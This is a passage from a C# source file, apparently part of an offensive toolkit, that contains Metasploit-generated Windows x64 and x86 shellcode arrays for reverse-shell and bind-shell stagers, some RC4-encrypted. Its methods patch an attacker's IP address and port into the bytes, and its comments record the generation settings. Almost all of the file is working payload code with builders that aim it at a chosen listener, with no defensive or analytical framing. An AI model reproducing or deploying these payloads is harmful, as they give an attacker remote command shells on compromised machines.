                    0x99, 0xa5, 0x74, 0x61, 0xff, 0xd5, 0x85, 0xc0, 0x74, 0x0c, 0x49, 0xff, 0xce, 0x75, 0xe5,
                    0x68, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x48, 0x83, 0xec, 0x10, 0x48, 0x89, 0xe2, 0x4d,
                    0x31, 0xc9, 0x6a, 0x04, 0x41, 0x58, 0x48, 0x89, 0xf9, 0x41, 0xba, 0x02, 0xd9, 0xc8, 0x5f,
                    0xff, 0xd5, 0x48, 0x83, 0xc4, 0x20, 0x5e, 0x89, 0xf6, 0x6a, 0x40, 0x41, 0x59, 0x68, 0x00,
                    0x10, 0x00, 0x00, 0x41, 0x58, 0x48, 0x89, 0xf2, 0x48, 0x31, 0xc9, 0x41, 0xba, 0x58, 0xa4,
                    0x53, 0xe5, 0xff, 0xd5, 0x48, 0x89, 0xc3, 0x49, 0x89, 0xc7, 0x4d, 0x31, 0xc9, 0x49, 0x89,
                    0xf0, 0x48, 0x89, 0xda, 0x48, 0x89, 0xf9, 0x41, 0xba, 0x02, 0xd9, 0xc8, 0x5f, 0xff, 0xd5,
                    0x48, 0x01, 0xc3, 0x48, 0x29, 0xc6, 0x48, 0x85, 0xf6, 0x75, 0xe1, 0x41, 0xff, 0xe7
                };
				string[] array2 = Ip.Split('.');
				array[246] = Convert.ToByte(array2[0]);
				array[247] = Convert.ToByte(array2[1]);
				array[248] = Convert.ToByte(array2[2]);
				array[249] = Convert.ToByte(array2[3]);
				int num = int.Parse(Port);
				byte b = 0;
				if (num > 256)
				{
					int num2 = num / 256;
					int num3 = num2 * 256;
					int num4 = num - num3;
					int num5 = num2 * 256 + num4;
					bool flag2 = num == num5;
					if (flag2)
					{
						array[244] = Convert.ToByte(num2);
						array[245] = Convert.ToByte(num4);
					}
					else
					{
						array[244] = b;
						array[245] = Convert.ToByte(num);
					}
				}
				return array;
			}
            /// <summary>
            /// Generate Shellcode Aray
            /// </summary>
            /// <param name="Ip">Set Shellcode Reverse IP Address (LHOST)</param>
            /// <param name="Port">Set Shellcode Reverse Port Number (LPORT)</param>
            /// <returns></returns>
            public byte[] ShellReverseTcpRc4(string Ip, string Port)
            {
                /*
                 * windows/x64/shell/reverse_tcp_rc4 - 585 bytes (stage 1)
                 * http://www.metasploit.com
                 * VERBOSE=false, LHOST=192.168.228.147, LPORT=4444, 
                 * ReverseAllowProxy=false, ReverseListenerThreaded=false, 
                 * StagerRetryCount=10, StagerRetryWait=5, 
                 * PayloadUUIDTracking=false, EnableStageEncoding=false, 
                 * StageEncoderSaveRegisters=, StageEncodingFallback=true, 
                 * PrependMigrate=false, EXITFUNC=process, RC4PASSWORD=msf
                 */
                byte[] array = new byte[]
                {
                    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
                    0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
                    0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9,
                    0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
                    0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48,
                    0x01, 0xd0, 0x66, 0x81, 0x78, 0x18, 0x0b, 0x02, 0x0f, 0x85, 0x72, 0x00, 0x00, 0x00, 0x8b,
                    0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b,
                    0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41,
                    0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1,
                    0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45,
                    0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b,
                    0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01,
                    0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48,
                    0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9,
                    0x4b, 0xff, 0xff, 0xff, 0x5d, 0x49, 0xbe, 0x77, 0x73, 0x32, 0x5f, 0x33, 0x32, 0x00, 0x00,
                    0x41, 0x56, 0x49, 0x89, 0xe6, 0x48, 0x81, 0xec, 0xa0, 0x01, 0x00, 0x00, 0x49, 0x89, 0xe5,
                    0x49, 0xbc, 0x02, 0x00, 0x11, 0x5c, 0xc0, 0xa8, 0xe4, 0x93, 0x41, 0x54, 0x49, 0x89, 0xe4,
                    0x4c, 0x89, 0xf1, 0x41, 0xba, 0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5, 0x4c, 0x89, 0xea, 0x68,
                    0x01, 0x01, 0x00, 0x00, 0x59, 0x41, 0xba, 0x29, 0x80, 0x6b, 0x00, 0xff, 0xd5, 0x6a, 0x0a,
                    0x41, 0x5e, 0x50, 0x50, 0x4d, 0x31, 0xc9, 0x4d, 0x31, 0xc0, 0x48, 0xff, 0xc0, 0x48, 0x89,
                    0xc2, 0x48, 0xff, 0xc0, 0x48, 0x89, 0xc1, 0x41, 0xba, 0xea, 0x0f, 0xdf, 0xe0, 0xff, 0xd5,
                    0x48, 0x89, 0xc7, 0x6a, 0x10, 0x41, 0x58, 0x4c, 0x89, 0xe2, 0x48, 0x89, 0xf9, 0x41, 0xba,
                    0x99, 0xa5, 0x74, 0x61, 0xff, 0xd5, 0x85, 0xc0, 0x74, 0x0c, 0x49, 0xff, 0xce, 0x75, 0xe5,
                    0x68, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x48, 0x83, 0xec, 0x10, 0x48, 0x89, 0xe2, 0x4d,
                    0x31, 0xc9, 0x6a, 0x04, 0x41, 0x58, 0x48, 0x89, 0xf9, 0x41, 0xba, 0x02, 0xd9, 0xc8, 0x5f,
                    0xff, 0xd5, 0x48, 0x83, 0xc4, 0x20, 0x5e, 0x89, 0xf6, 0x81, 0xf6, 0xa0, 0x05, 0xa2, 0xd3,
                    0x4c, 0x8d, 0x9e, 0x00, 0x01, 0x00, 0x00, 0x6a, 0x40, 0x41, 0x59, 0x68, 0x00, 0x10, 0x00,
                    0x00, 0x41, 0x58, 0x48, 0x89, 0xf2, 0x48, 0x31, 0xc9, 0x41, 0xba, 0x58, 0xa4, 0x53, 0xe5,
                    0xff, 0xd5, 0x48, 0x8d, 0x98, 0x00, 0x01, 0x00, 0x00, 0x49, 0x89, 0xdf, 0x53, 0x56, 0x50,
                    0x4d, 0x31, 0xc9, 0x49, 0x89, 0xf0, 0x48, 0x89, 0xda, 0x48, 0x89, 0xf9, 0x41, 0xba, 0x02,
                    0xd9, 0xc8, 0x5f, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x20, 0x48, 0x01, 0xc3, 0x48, 0x29, 0xc6,
                    0x75, 0xe0, 0x49, 0x89, 0xfe, 0x5f, 0x59, 0x41, 0x59, 0x41, 0x56, 0xe8, 0x10, 0x00, 0x00,
                    0x00, 0x34, 0x2a, 0x68, 0x7e, 0xa2, 0xd0, 0x53, 0x60, 0xc9, 0x53, 0x10, 0x7a, 0xcb, 0xe8,
                    0x3e, 0x08, 0x5e, 0x48, 0x31, 0xc0, 0x49, 0x89, 0xf8, 0xaa, 0xfe, 0xc0, 0x75, 0xfb, 0x48,
                    0x31, 0xdb, 0x41, 0x02, 0x1c, 0x00, 0x48, 0x89, 0xc2, 0x80, 0xe2, 0x0f, 0x02, 0x1c, 0x16,
                    0x41, 0x8a, 0x14, 0x00, 0x41, 0x86, 0x14, 0x18, 0x41, 0x88, 0x14, 0x00, 0xfe, 0xc0, 0x75,
                    0xe3, 0x48, 0x31, 0xdb, 0xfe, 0xc0, 0x41, 0x02, 0x1c, 0x00, 0x41, 0x8a, 0x14, 0x00, 0x41,
                    0x86, 0x14, 0x18, 0x41, 0x88, 0x14, 0x00, 0x41, 0x02, 0x14, 0x18, 0x41, 0x8a, 0x14, 0x10,
                    0x41, 0x30, 0x11, 0x49, 0xff, 0xc1, 0x48, 0xff, 0xc9, 0x75, 0xdb, 0x5f, 0x41, 0xff, 0xe7
                };
                string[] array2 = Ip.Split('.');
                array[246] = Convert.ToByte(array2[0]);
                array[247] = Convert.ToByte(array2[1]);
                array[248] = Convert.ToByte(array2[2]);
                array[249] = Convert.ToByte(array2[3]);
                int num = int.Parse(Port);
                byte b = 0;
                if (num > 256)
                {
                    int num2 = num / 256;
                    int num3 = num2 * 256;
                    int num4 = num - num3;
                    int num5 = num2 * 256 + num4;
                    bool flag2 = num == num5;
                    if (flag2)
                    {
                        array[244] = Convert.ToByte(num2);
                        array[245] = Convert.ToByte(num4);
                    }
                    else
                    {
                        array[244] = b;
                        array[245] = Convert.ToByte(num);
                    }
                }
                return array;
            }
            /// <summary>
            /// Generate Shellcode Aray
            /// </summary>
            /// <param name="Port">Shellcode Listen Port Number (LPORT)</param>
            /// <returns></returns>
            public byte[] ShellBindTcp(string Port)
            {
                /*
                 * windows/x64/shell/bind_tcp - 483 bytes (stage 1)
                 * http://www.metasploit.com
                 * VERBOSE=false, LPORT=4444, RHOST=, 
                 * PayloadUUIDTracking=false, EnableStageEncoding=false, 
                 * StageEncoderSaveRegisters=, StageEncodingFallback=true, 
                 * PrependMigrate=false, EXITFUNC=process, 
                 * InitialAutoRunScript=, AutoRunScript=
                 */
                byte[] array = new byte[]
                {
                    0xfc, 0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0xe8, 0xcc, 0x00, 0x00, 0x00, 0x41, 0x51,
                    0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b,
                    0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a,
                    0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1,
                    0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b,
                    0x42, 0x3c, 0x48, 0x01, 0xd0, 0x66, 0x81, 0x78, 0x18, 0x0b, 0x02, 0x0f, 0x85, 0x72, 0x00,
                    0x00, 0x00, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
                    0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48,
                    0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
                    0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c,
                    0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
                    0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04,
                    0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
                    0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48,
                    0x8b, 0x12, 0xe9, 0x4b, 0xff, 0xff, 0xff, 0x5d, 0x49, 0xbe, 0x77, 0x73, 0x32, 0x5f, 0x33,
                    0x32, 0x00, 0x00, 0x41, 0x56, 0x49, 0x89, 0xe6, 0x48, 0x81, 0xec, 0xa0, 0x01, 0x00, 0x00,
                    0x49, 0x89, 0xe5, 0x48, 0x31, 0xc0, 0x50, 0x50, 0x49, 0xc7, 0xc4, 0x02, 0x00, 0x11, 0x5c,
                    0x41, 0x54, 0x49, 0x89, 0xe4, 0x4c, 0x89, 0xf1, 0x41, 0xba, 0x4c, 0x77, 0x26, 0x07, 0xff,
                    0xd5, 0x4c, 0x89, 0xea, 0x68, 0x01, 0x01, 0x00, 0x00, 0x59, 0x41, 0xba, 0x29, 0x80, 0x6b,
                    0x00, 0xff, 0xd5, 0x6a, 0x02, 0x59, 0x50, 0x50, 0x4d, 0x31, 0xc9, 0x4d, 0x31, 0xc0, 0x48,
                    0xff, 0xc0, 0x48, 0x89, 0xc2, 0x41, 0xba, 0xea, 0x0f, 0xdf, 0xe0, 0xff, 0xd5, 0x48, 0x89,
                    0xc7, 0x6a, 0x10, 0x41, 0x58, 0x4c, 0x89, 0xe2, 0x48, 0x89, 0xf9, 0x41, 0xba, 0xc2, 0xdb,
                    0x37, 0x67, 0xff, 0xd5, 0x48, 0x31, 0xd2, 0x48, 0x89, 0xf9, 0x41, 0xba, 0xb7, 0xe9, 0x38,
                    0xff, 0xff, 0xd5, 0x4d, 0x31, 0xc0, 0x48, 0x31, 0xd2, 0x48, 0x89, 0xf9, 0x41, 0xba, 0x74,
                    0xec, 0x3b, 0xe1, 0xff, 0xd5, 0x48, 0x89, 0xf9, 0x48, 0x89, 0xc7, 0x41, 0xba, 0x75, 0x6e,
                    0x4d, 0x61, 0xff, 0xd5, 0x48, 0x81, 0xc4, 0xb0, 0x02, 0x00, 0x00, 0x48, 0x83, 0xec, 0x10,
                    0x48, 0x89, 0xe2, 0x4d, 0x31, 0xc9, 0x6a, 0x04, 0x41, 0x58, 0x48, 0x89, 0xf9, 0x41, 0xba,
                    0x02, 0xd9, 0xc8, 0x5f, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x20, 0x5e, 0x89, 0xf6, 0x6a, 0x40,
                    0x41, 0x59, 0x68, 0x00, 0x10, 0x00, 0x00, 0x41, 0x58, 0x48, 0x89, 0xf2, 0x48, 0x31, 0xc9,
                    0x41, 0xba, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x48, 0x89, 0xc3, 0x49, 0x89, 0xc7, 0x4d,
                    0x31, 0xc9, 0x49, 0x89, 0xf0, 0x48, 0x89, 0xda, 0x48, 0x89, 0xf9, 0x41, 0xba, 0x02, 0xd9,
                    0xc8, 0x5f, 0xff, 0xd5, 0x48, 0x01, 0xc3, 0x48, 0x29, 0xc6, 0x48, 0x85, 0xf6, 0x75, 0xe1,
                    0x41, 0xff, 0xe7
                };
				int num = int.Parse(Port);
				byte b = 0;
				if (num > 256)
				{
					int num2 = num / 256;
					int num3 = num2 * 256;
					int num4 = num - num3;
					int num5 = num2 * 256 + num4;
					bool flag2 = num == num5;
					if (flag2)
					{
						array[253] = Convert.ToByte(num2);
						array[254] = Convert.ToByte(num4);
					}
					else
					{
						array[253] = b;
						array[254] = Convert.ToByte(num);
					}
				}
				return array;
			}
            /// <summary>
            /// Generate Shellcode Aray
            /// </summary>
            /// <param name="Port">Shellcode Listen Port Number (LPORT)</param>
            /// <returns></returns>
            public byte[] ShellBindTcpRc4(string Port)
            {
                /*
                 * windows/x64/shell/bind_tcp_rc4 - 402 bytes (stage 1)
                 * http://www.metasploit.com
                 * VERBOSE=false, LPORT=4444, RHOST=, 
                 * PayloadUUIDTracking=false, EnableStageEncoding=false, 
                 * StageEncoderSaveRegisters=, StageEncodingFallback=true, 
                 * PrependMigrate=false, EXITFUNC=process, RC4PASSWORD=iSMET
                 */
                byte[] array = new byte[]
                {
                    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
                    0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
                    0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9,
                    0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
                    0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48,
                    0x01, 0xd0, 0x66, 0x81, 0x78, 0x18, 0x0b, 0x02, 0x0f, 0x85, 0x72, 0x00, 0x00, 0x00, 0x8b,
                    0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b,
                    0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41,
                    0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1,
                    0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45,
                    0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b,
                    0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01,
                    0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48,
                    0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9,
                    0x4b, 0xff, 0xff, 0xff, 0x5d, 0x49, 0xbe, 0x77, 0x73, 0x32, 0x5f, 0x33, 0x32, 0x00, 0x00,
                    0x41, 0x56, 0x49, 0x89, 0xe6, 0x48, 0x81, 0xec, 0xa0, 0x01, 0x00, 0x00, 0x49, 0x89, 0xe5,
                    0x48, 0x31, 0xc0, 0x50, 0x50, 0x49, 0xc7, 0xc4, 0x02, 0x00, 0x11, 0x5c, 0x41, 0x54, 0x49,
                    0x89, 0xe4, 0x4c, 0x89, 0xf1, 0x41, 0xba, 0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5, 0x4c, 0x89,
                    0xea, 0x68, 0x01, 0x01, 0x00, 0x00, 0x59, 0x41, 0xba, 0x29, 0x80, 0x6b, 0x00, 0xff, 0xd5,
                    0x6a, 0x02, 0x59, 0x50, 0x50, 0x4d, 0x31, 0xc9, 0x4d, 0x31, 0xc0, 0x48, 0xff, 0xc0, 0x48,
                    0x89, 0xc2, 0x41, 0xba, 0xea, 0x0f, 0xdf, 0xe0, 0xff, 0xd5, 0x48, 0x89, 0xc7, 0x6a, 0x10,
                    0x41, 0x58, 0x4c, 0x89, 0xe2, 0x48, 0x89, 0xf9, 0x41, 0xba, 0xc2, 0xdb, 0x37, 0x67, 0xff,
                    0xd5, 0x48, 0x31, 0xd2, 0x48, 0x89, 0xf9, 0x41, 0xba, 0xb7, 0xe9, 0x38, 0xff, 0xff, 0xd5,
                    0x4d, 0x31, 0xc0, 0x48, 0x31, 0xd2, 0x48, 0x89, 0xf9, 0x41, 0xba, 0x74, 0xec, 0x3b, 0xe1,
                    0xff, 0xd5, 0x48, 0x89, 0xf9, 0x48, 0x89, 0xc7, 0x41, 0xba, 0x75, 0x6e, 0x4d, 0x61, 0xff,
                    0xd5, 0x48, 0x81, 0xc4, 0xb0, 0x02, 0x00, 0x00, 0x48, 0x83, 0xec, 0x10, 0x48, 0x89, 0xe2,
                    0x4d, 0x31, 0xc9, 0x6a, 0x04, 0x41, 0x58, 0x48, 0x89, 0xf9, 0x41, 0xba, 0x02, 0xd9, 0xc8,
                    0x5f, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x20, 0x5e, 0x89, 0xf6, 0x81, 0xf6, 0xad, 0xb4, 0xa3,
                    0x6c, 0x4c, 0x8d, 0x9e, 0x00, 0x01, 0x00, 0x00, 0x6a, 0x40, 0x41, 0x59, 0x68, 0x00, 0x10,
                    0x00, 0x00, 0x41, 0x58, 0x48, 0x89, 0xf2, 0x48, 0x31, 0xc9, 0x41, 0xba, 0x58, 0xa4, 0x53,
                    0xe5, 0xff, 0xd5, 0x48, 0x8d, 0x98, 0x00, 0x01, 0x00, 0x00, 0x49, 0x89, 0xdf, 0x53, 0x56,
                    0x50, 0x4d, 0x31, 0xc9, 0x49, 0x89, 0xf0, 0x48, 0x89, 0xda, 0x48, 0x89, 0xf9, 0x41, 0xba,
                    0x02, 0xd9, 0xc8, 0x5f, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x20, 0x48, 0x01, 0xc3, 0x48, 0x29,
                    0xc6, 0x75, 0xe0, 0x49, 0x89, 0xfe, 0x5f, 0x59, 0x41, 0x59, 0x41, 0x56, 0xe8, 0x10, 0x00,
                    0x00, 0x00, 0x33, 0x64, 0x85, 0x57, 0xde, 0x04, 0x08, 0x04, 0x8f, 0x3a, 0x80, 0xd4, 0xab,
                    0x99, 0x55, 0xf8, 0x5e, 0x48, 0x31, 0xc0, 0x49, 0x89, 0xf8, 0xaa, 0xfe, 0xc0, 0x75, 0xfb,
                    0x48, 0x31, 0xdb, 0x41, 0x02, 0x1c, 0x00, 0x48, 0x89, 0xc2, 0x80, 0xe2, 0x0f, 0x02, 0x1c,
                    0x16, 0x41, 0x8a, 0x14, 0x00, 0x41, 0x86, 0x14, 0x18, 0x41, 0x88, 0x14, 0x00, 0xfe, 0xc0,
                    0x75, 0xe3, 0x48, 0x31, 0xdb, 0xfe, 0xc0, 0x41, 0x02, 0x1c, 0x00, 0x41, 0x8a, 0x14, 0x00,
                    0x41, 0x86, 0x14, 0x18, 0x41, 0x88, 0x14, 0x00, 0x41, 0x02, 0x14, 0x18, 0x41, 0x8a, 0x14,
                    0x10, 0x41, 0x30, 0x11, 0x49, 0xff, 0xc1, 0x48, 0xff, 0xc9, 0x75, 0xdb, 0x5f, 0x41, 0xff,
                    0xe7, 0x58, 0x6a, 0x00, 0x59, 0x49, 0xc7, 0xc2, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5
                };
                int num = int.Parse(Port);
                byte b = 0;
                if (num > 256)
                {
                    int num2 = num / 256;
                    int num3 = num2 * 256;
                    int num4 = num - num3;
                    int num5 = num2 * 256 + num4;
                    bool flag2 = num == num5;
                    if (flag2)
                    {
                        array[250] = Convert.ToByte(num2);
                        array[251] = Convert.ToByte(num4);
                    }
                    else
                    {
                        array[250] = b;
                        array[251] = Convert.ToByte(num);
                    }
                }
                return array;
            }
        }
		public class x86ShellString
		{
			public string ReverseTcp(string Ip, string Port)
			{
				string text = "0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0x89,0xe8,0xff,0xd0,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a,0x68,0xc0,0xa8,0xe4,0x93,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x75,0xee,0xc3";
				string[] array = text.Split(new char[]
				{
					','
				});
				string empty = string.Empty;
				string[] array2 = Ip.Split(new char[]
				{
					'.'
				});
				int value = int.Parse(array2[0]);
				int value2 = int.Parse(array2[1]);
				int value3 = int.Parse(array2[2]);
				int value4 = int.Parse(array2[3]);
				array[176] = "0x" + Convert.ToString(value, 16);
				array[177] = "0x" + Convert.ToString(value2, 16);
				array[178] = "0x" + Convert.ToString(value3, 16);
				array[179] = "0x" + Convert.ToString(value4, 16);
				int num = int.Parse(Port);
				bool flag = num > 256;
				if (flag)
				{
					int num2 = num / 256;
					int num3 = num2 * 256;
					int num4 = num - num3;
					int num5 = num2 * 256 + num4;
					bool flag2 = num == num5;
					if (flag2)
					{
						array[183] = "0x" + Convert.ToString(num2, 16);
						array[184] = "0x" + Convert.ToString(num4, 16);
					}
					else
					{
						array[183] = "0x00";
						array[184] = "0x" + Convert.ToString(num, 16);
					}
				}
				return string.Join(",", array);
			}
		}
	}
}
